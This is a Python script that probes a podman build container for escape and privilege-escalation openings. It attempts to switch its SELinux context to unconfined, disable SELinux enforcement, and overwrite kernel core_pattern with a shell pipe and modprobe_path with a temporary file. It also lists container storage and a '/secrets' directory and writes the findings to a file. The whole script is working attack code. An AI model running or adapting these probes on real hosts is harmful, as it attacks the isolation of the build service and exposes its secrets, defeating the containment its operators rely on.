import os
out=[]
def t(label, fn):
    try: out.append("%s -> %r"%(label, fn()))
    except Exception as e: out.append("%s -> %s:%s"%(label, type(e).__name__, str(e)[:80]))
# SELinux domain probing (BUILD container = podman_in_podman.process)
t("attr/current", lambda: open('/proc/self/attr/current').read())
t("attr/exec(read)", lambda: open('/proc/self/attr/exec').read())
t("attr/exec(write)", lambda: (open('/proc/self/attr/exec','w').write('system_u:system_r:unconfined_t:s0'), open('/proc/self/attr/exec').read())[1])
t("attr/fscreate", lambda: open('/proc/self/attr/fscreate').read())
t("enforce file", lambda: open('/sys/fs/selinux/enforce').read())
t("enforce write", lambda: open('/sys/fs/selinux/enforce','w').write('0'))
t("boolean", lambda: open('/sys/fs/selinux/booleans/container_use_devices').read())
# procfs writes in BUILD container
t("core_pattern(w)", lambda: open('/proc/sys/kernel/core_pattern','w').write('|/bin/sh\r'))
t("core_pattern(r)", lambda: open('/proc/sys/kernel/core_pattern').read().strip())
t("modprobe_path(w)", lambda: open('/proc/sys/kernel/modprobe','w').write('/tmp/x'))
t("ns_last_pid(w)", lambda: open('/proc/sys/kernel/ns_last_pid','w').write('1'))
# podman/buildah storage during build (same domain as builder)
import glob
for p in ['/podman','/var/lib/containers','/run/podman','/run/containers','/run/.containerenv','/build','/build/input','/build/output','/secrets']:
    t(p, lambda p=p: os.listdir(p)[:12])
t("glob overlay-containers", lambda: glob.glob('/**/overlay-containers/*/userdata/config.json', recursive=False)[:3])
# /proc/1 writables
for x in ['/proc/1/attr/current','/proc/1/attr/exec','/proc/1/comm','/proc/1/oom_score_adj','/proc/1/task']:
    t(x, lambda x=x: open(x).read()[:80] if os.path.isfile(x) else os.listdir(x)[:5])
open('/app/BUILDX.txt','w').write("\n".join(out))
# 1792265579
